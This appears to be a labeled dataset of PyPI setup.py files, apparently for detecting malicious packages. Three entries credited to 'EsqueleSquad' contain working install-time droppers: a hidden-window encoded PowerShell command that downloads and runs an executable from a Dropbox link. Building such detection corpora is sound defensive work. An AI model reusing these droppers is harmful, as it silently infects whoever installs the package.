{"idx": "flake8_functions_names-0.3.0", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_functions_names'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_functions_names/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n    return None\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description=(\n        'An extension for flake8 that validates functions names, '\n        'decomposition and conformity with annotations.'\n    ),\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    packages=find_packages(),\n    python_requires='>=3.8',\n    include_package_data=True,\n    keywords='flake8',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['setuptools'],\n    entry_points={\n        'flake8.extension': [\n            'FNE = flake8_functions_names.checker:FunctionsNamesChecker',\n        ],\n    },\n    url='https://github.com/Melevir/flake8-functions-names',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "djangorestframework-filters-0.11.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\nimport os\n\n\nwith open('README.rst') as f:\n    README = f.read()\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nsetup(\n    name='djangorestframework-filters',\n    version='0.11.1',\n    url='http://github.com/philipn/django-rest-framework-filters',\n    license='MIT',\n    long_description=README,\n    description='Better filtering for Django REST Framework',\n    author='Philip Neustrom',\n    author_email='philipn@gmail.com',\n    packages=get_packages('rest_framework_filters'),\n    package_data=get_package_data('rest_framework_filters'),\n    zip_safe=False,\n    install_requires=[\n        'djangorestframework',\n        'django-filter~=1.1',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "ghapi-1.0.0", "func": "from pkg_resources import parse_version\nfrom configparser import ConfigParser\nimport setuptools,re,sys\nassert parse_version(setuptools.__version__)>=parse_version('36.2')\n\n# note: all settings are in settings.ini; edit there, not here\nconfig = ConfigParser(delimiters=['='])\nconfig.read('settings.ini')\ncfg = config['DEFAULT']\n\ncfg_keys = 'version description keywords author author_email'.split()\nexpected = cfg_keys + \"lib_name user branch license status min_python audience language\".split()\nfor o in expected: assert o in cfg, \"missing expected setting: {}\".format(o)\nsetup_cfg = {o:cfg[o] for o in cfg_keys}\n\nif len(sys.argv)>1 and sys.argv[1]=='version':\n    print(setup_cfg['version'])\n    exit()\n\nlicenses = {\n    'apache2': ('Apache Software License 2.0','OSI Approved :: Apache Software License'),\n}\nstatuses = [ '1 - Planning', '2 - Pre-Alpha', '3 - Alpha',\n    '4 - Beta', '5 - Production/Stable', '6 - Mature', '7 - Inactive' ]\npy_versions = '2.0 2.1 2.2 2.3 2.4 2.5 2.6 2.7 3.0 3.1 3.2 3.3 3.4 3.5 3.6 3.7 3.8 3.9 3.10'.split()\nmin_python = cfg['min_python']\nlic = licenses[cfg['license']]\n\nrequirements = ['pip', 'packaging']\nif cfg.get('requirements'): requirements += cfg.get('requirements','').split()\nif cfg.get('pip_requirements'): requirements += cfg.get('pip_requirements','').split()\ndev_requirements = (cfg.get('dev_requirements') or '').split()\n\nlong_description = open('README.md').read()\n# ![png](docs/images/output_13_0.png)\nfor ext in ['png', 'svg']:\n    long_description = re.sub(r'!\\['+ext+'\\]\\((.*)\\)', '!['+ext+']('+'https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1)', long_description)\n    long_description = re.sub(r'src=\\\"(.*)\\.'+ext+'\\\"', 'src=\\\"https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1.'+ext+'\\\"', long_description)\n\nproject_urls = {}\nif cfg.get('doc_host'): project_urls[\"Documentation\"] = cfg['doc_host'] + cfg.get('doc_baseurl', '')\n    \nsetuptools.setup(\n    name = 'ghapi',\n    license = lic[0],\n    classifiers = [\n        'Development Status :: ' + statuses[int(cfg['status'])],\n        'Intended Audience :: ' + cfg['audience'].title(),\n        'License :: ' + lic[1],\n        'Natural Language :: ' + cfg['language'].title(),\n    ] + ['Programming Language :: Python :: '+o for o in py_versions[py_versions.index(min_python):]],\n    url = cfg['git_url'],\n    packages = setuptools.find_packages(),\n    include_package_data = True,\n    install_requires = requirements,\n    extras_require={ 'dev': dev_requirements },\n    python_requires  = '>=' + cfg['min_python'],\n    long_description = long_description,\n    long_description_content_type = 'text/markdown',\n    zip_safe = False,\n    entry_points = { 'console_scripts': cfg.get('console_scripts','').split() },\n    project_urls = project_urls,\n    **setup_cfg)\n\n", "target": 0}
{"idx": "esqccre-10.72", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccre',\n    packages = ['modlib'],\n    version = '10.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "loadlib-3.65", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'loadlib',\n    packages = ['modlib'],\n    version = '8.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "extract_msg-0.36.2", "func": "import os\nfrom setuptools import setup\nimport re\n\n\n# A handful of variables that are used a couple of times.\ngithub_url = 'https://github.com/TeamMsgExtractor/msg-extractor'\nmain_module = 'extract_msg'\n\n# Read in the description from README.\nwith open('README.rst', 'rb') as stream:\n    long_description = stream.read().decode('utf-8').replace('\\r', '')\n\n# Get the version string this way to avoid issues with modules not being\n# installed before setup.\nversion_re = re.compile(\"__version__ = '(?P<version>[0-9\\\\.]*)'\")\nwith open('extract_msg/__init__.py', 'r') as stream:\n    contents = stream.read()\nmatch = version_re.search(contents)\nversion = match.groupdict()['version']\n\n# Read in the dependencies from the virtualenv requirements file.\ndependencies = []\nfilename = os.path.join('requirements.txt')\nwith open(filename, 'r') as stream:\n    for line in stream:\n        package = line.strip().split('#')[0]\n        if package:\n            dependencies.append(package)\n\nsetup(\n    name=main_module,\n    version=version,\n    description=\"Extracts emails and attachments saved in Microsoft Outlook's .msg files\",\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    url=github_url,\n    download_url='%s/archives/master' % github_url,\n    author='Destiny Peterson & Matthew Walker',\n    author_email='arceusthe@gmail.com, mattgwwalker@gmail.com',\n    license='GPL',\n    packages=[main_module],\n    py_modules=[main_module],\n    entry_points={\n        'console_scripts': ['extract_msg = extract_msg.__main__:main',]\n    },\n    include_package_data=True,\n    install_requires=dependencies,\n    python_requires='>=3.6',\n)\n", "target": 0}
{"idx": "ttat-api-1.0.5", "func": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nVERSION = '1.0.5'\nDESCRIPTION = 'test'\nLONG_DESCRIPTION = 'Learning stuff or whatever'\n\n# Setting up\nsetup(\n    name=\"ttat-api\",\n    version=VERSION,\n    author=\"serverinspector2\",\n    author_email=\"serverinspector+2@wearehackerone.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=['requests'],\n    keywords=[]\n   )\n", "target": 1}
{"idx": "gcsfs-2022.7.1", "func": "#!/usr/bin/env python\n\nimport os\nfrom setuptools import setup\nimport versioneer\n\n\nsetup(\n    name=\"gcsfs\",\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    description=\"Convenient Filesystem interface over GCS\",\n    url=\"https://github.com/fsspec/gcsfs\",\n    maintainer=\"Martin Durant\",\n    maintainer_email=\"mdurant@anaconda.com\",\n    license=\"BSD\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    keywords=[\"google-cloud-storage\", \"gcloud\", \"file-system\"],\n    packages=[\"gcsfs\", \"gcsfs.cli\"],\n    install_requires=[open(\"requirements.txt\").read().strip().split(\"\\n\")],\n    long_description=(\n        open(\"README.rst\").read() if os.path.exists(\"README.rst\") else \"\"\n    ),\n    extras_require={\"gcsfuse\": [\"fusepy\"], \"crc\": [\"crcmod\"]},\n    python_requires=\">=3.7\",\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "frozendict-2.3.4", "func": "#!/usr/bin/env python3\n\nimport setuptools\nfrom pathlib import Path\nimport sys\nfrom platform import python_implementation\n\nname = \"frozendict\"\nmain_package_name = \"frozendict\"\ntest_dir_name = \"test\"\nreadme_filename = \"README.md\"\nversion_filename = \"VERSION\"\npy_typed_filename = \"py.typed\"\nmain_url = \"https://github.com/Marco-Sulla/python-frozendict\"\nbug_url = \"https://github.com/Marco-Sulla/python-frozendict/issues\"\nauthor = \"Marco Sulla\"\nauthor_email = \"marcosullaroma@gmail.com\"\nlicense  = \"LGPL v3\"\nlicense_files = \"LICENSE.txt\"\ndescription = \"A simple immutable dictionary\"\nkeywords = \"immutable hashable picklable frozendict dict dictionary map Mapping MappingProxyType developers stable utility\"\npython_requires = \">=3.6\"\n\nclassifiers = [\n    \"Development Status :: 5 - Production/Stable\",\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)\",\n    \"Programming Language :: Python :: 3 :: Only\",\n    \"Programming Language :: Python :: 3.6\", \n    \"Natural Language :: English\", \n    \"Operating System :: OS Independent\", \n    \"Topic :: Software Development :: Libraries\",\n    \"Topic :: Software Development :: Libraries :: Python Modules\",\n    \"Topic :: Utilities\", \n]\n\ncurr_path = Path(__file__).resolve()\ncurr_dir = curr_path.parent\n\nreadme_path = curr_dir / readme_filename\nreadme_content_type = \"text/markdown\"\n\nlong_description = \"\"\n\nwith open(readme_path) as f:\n    long_description = f.read()\n\nmain_package_path = curr_dir / main_package_name\n\nversion = \"\"\nversion_path = main_package_path / version_filename\n\nwith open(version_path) as f:\n    version = f.read()\n\nexcluded_packages = (test_dir_name, )\npackages = setuptools.find_packages(exclude=excluded_packages)\npackage_data_filenames = (version_filename, py_typed_filename)\npackage_data = {package_name: package_data_filenames for package_name in packages}\n\n# C extension - START\n\nsrc_dir_name = \"src\"\nsrc_base_path = main_package_path / src_dir_name\ninclude_dir_name = \"Include\"\n\next1_name = \"_\" + name\next1_fullname = main_package_name + \".\" + ext1_name\next1_source1_name = name + \"object\"\next1_source1_fullname = ext1_source1_name + \".c\"\n\ncpython_objects_dir_name = \"Objects\"\ncpython_stringlib_name = \"stringlib\"\ncpython_objects_clinic_name = \"clinic\"\n\nextra_compile_args = [\"-DPY_SSIZE_T_CLEAN\", ]\n\npyversion = sys.version_info\n\ncpython_version = f\"{pyversion[0]}_{pyversion[1]}\"\n\nsrc_path = src_base_path / cpython_version\n\ncpython_path = src_path / \"cpython_src\"\ncpython_object_path = cpython_path / cpython_objects_dir_name\n\ninclude_path = src_path / include_dir_name\ncpython_stringlib_path = cpython_object_path / cpython_stringlib_name\ncpython_objects_clinic_path = cpython_object_path / cpython_objects_clinic_name\n\ncpython_include_dirs = [\n    str(include_path), \n    str(cpython_object_path), \n    str(cpython_stringlib_path), \n    str(cpython_objects_clinic_path), \n    str(cpython_path), \n]\n\next1_source1_path = src_path / ext1_source1_fullname\n\ncpython_sources_tmp = [ext1_source1_path, ]\n\ncpython_sources = [\n    str(x.relative_to(curr_dir))\n    for x in cpython_sources_tmp\n]\n\nundef_macros = []\n\nargv = sys.argv\n\nif argv[1] == \"c_debug\":\n    undef_macros = [\"NDEBUG\"]\n\next_modules = []\n\next_modules.append(setuptools.Extension(\n    ext1_fullname,\n    sources = cpython_sources,\n    include_dirs = cpython_include_dirs,\n    extra_compile_args = extra_compile_args,\n    undef_macros = undef_macros,\n))\n\n\n\n# C extension - END\n\ncommon_setup_args = dict(\n    name = name,\n    author = author,\n    author_email = author_email,\n    version = version,\n    python_requires = python_requires,\n    license  = license,\n    license_files = (license_files, ),\n    url = main_url,\n    \n    project_urls = {\n        \"Bug Reports\": bug_url,\n        \"Source\": main_url,\n    },\n    \n    packages = packages,\n    package_data = package_data,\n    \n    description = description,\n    long_description = long_description,\n    long_description_content_type = readme_content_type,\n    \n    classifiers = classifiers,\n    keywords = keywords,\n)\n\ncustom_arg = None\n\ncustom_args = (\"py\", \"c\", \"c_debug\")\n\nif len(argv) > 1 and argv[1] in custom_args:\n    custom_arg = argv[1]\n    sys.argv = [sys.argv[0]] + sys.argv[2:]\n\nimpl = python_implementation()\n\nif custom_arg == None:\n    if impl == \"PyPy\":\n        custom_arg = \"py\"\n    else:\n        custom_arg = \"c\"\n\nif custom_arg == \"py\":\n    setuptools.setup(**common_setup_args)\nelif custom_arg in (\"c\", \"c_debug\"):\n    setuptools.setup(ext_modules = ext_modules, **common_setup_args)\nelse:\n    raise ValueError(f\"Unsupported custom_arg {custom_arg}\")\n", "target": 0}
{"idx": "ddlparse-1.10.0", "func": "# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\nfrom codecs import open\nfrom os import path\nimport re\n\npackage_name = \"ddlparse\"\n\nroot_dir = path.abspath(path.dirname(__file__))\n\ndef _requirements():\n    return [name.rstrip() for name in open(path.join(root_dir, 'requirements.txt')).readlines()]\n\n\ndef _test_requirements():\n    return [name.rstrip() for name in open(path.join(root_dir, 'test-requirements.txt')).readlines()]\n\nwith open(path.join(root_dir, package_name, '__init__.py')) as f:\n    init_text = f.read()\n    version = re.search(r'__version__\\s*=\\s*[\\'\\\"](.+?)[\\'\\\"]', init_text).group(1)\n    license = re.search(r'__license__\\s*=\\s*[\\'\\\"](.+?)[\\'\\\"]', init_text).group(1)\n    author = re.search(r'__author__\\s*=\\s*[\\'\\\"](.+?)[\\'\\\"]', init_text).group(1)\n    author_email = re.search(r'__author_email__\\s*=\\s*[\\'\\\"](.+?)[\\'\\\"]', init_text).group(1)\n    url = re.search(r'__url__\\s*=\\s*[\\'\\\"](.+?)[\\'\\\"]', init_text).group(1)\n\nassert version\nassert license\nassert author\nassert author_email\nassert url\n\nwith open('README.md', encoding='utf-8') as f:\n    long_description = f.read()\n\n\nsetup(\n    name=package_name,\n    packages=[package_name],\n\n    version=version,\n\n    license=license,\n\n    install_requires=_requirements(),\n    tests_require=_test_requirements(),\n\n    author=author,\n    author_email=author_email,\n\n    url=url,\n\n    description='DDL parase and Convert to BigQuery JSON schema',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    keywords='ddl sql parse bigquery',\n\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Database',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "lgtbhttp-3.65", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'LGTBhttp',\n    packages = ['modlib'],\n    version = '6.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagster-docker-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_docker/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-docker\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"A Dagster integration for docker\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-docker\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_docker_tests*\"]),\n        install_requires=[\"dagster==1.0.3\", \"docker\", \"docker-image-py\"],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "grpcio-opentracing-1.1.4", "func": "import os\nimport logging\nimport sys\nimport tempfile\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\nVERSION='1.1.4'\n\ndef readme():\n  \"\"\"Use `pandoc` to convert `README.md` into a `README.rst` file.\"\"\"\n  if os.path.isfile('README.md') and any('dist' in x for x in sys.argv[1:]):\n    if os.system('pandoc -s README.md -o %s/README.rst' %\n                 tempfile.mkdtemp()) != 0:\n      logging.warning('Unable to generate README.rst')\n  if os.path.isfile('README.rst'):\n    with open('README.rst') as fd:\n      return fd.read()\n  return ''\n\n\nclass VerifyVersionCommand(install):\n    \"\"\"Custom command to verify that the git tag matches our version\"\"\"\n    description = 'verify that the git tag matches our version'\n\n    def run(self):\n        tag = os.getenv('CIRCLE_TAG')\n\n        if tag[1:] != VERSION:\n            info = \"Git tag: {0} does not match the version of this app: {1}\".format(\n                tag, VERSION\n            )\n            sys.exit(info)\n\n\nsetup(\n    name='grpcio-opentracing',\n    version=VERSION,\n    description='Python OpenTracing Extensions for gRPC',\n    long_description=readme(),\n    author='LightStep',\n    license='Apache',\n    install_requires=['opentracing>=1.2.2', 'grpcio>=1.1.3,<2.0', 'six>=1.10'],\n    setup_requires=['pytest-runner'],\n    tests_require=['pytest', 'future'],\n    keywords=['opentracing'],\n    classifiers=[\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2.7',\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\"\n    ],\n    packages=find_packages(exclude=['docs*', 'tests*', 'examples*']),\n    cmdclass={\n        'verify': VerifyVersionCommand,\n    }\n)\n", "target": 0}
{"idx": "WkquBsXEkbXn-0.3.2", "func": "from __future__ import with_statement\n\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'WkquBsXEkbXn'\n\n\ndef read_file(path):\n    with open(os.path.join(os.path.dirname(__file__), path)) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version='0.3.2',\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/WkquBsXEkbXn',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "google-cloud-secret-manager-2.12.2", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-secret-manager\"\ndescription = \"Secret Manager API API client library\"\nversion = \"2.12.2\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-secret-manager\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_secretmanager_v1_keywords.py\",\n        \"scripts/fixup_secretmanager_v1beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
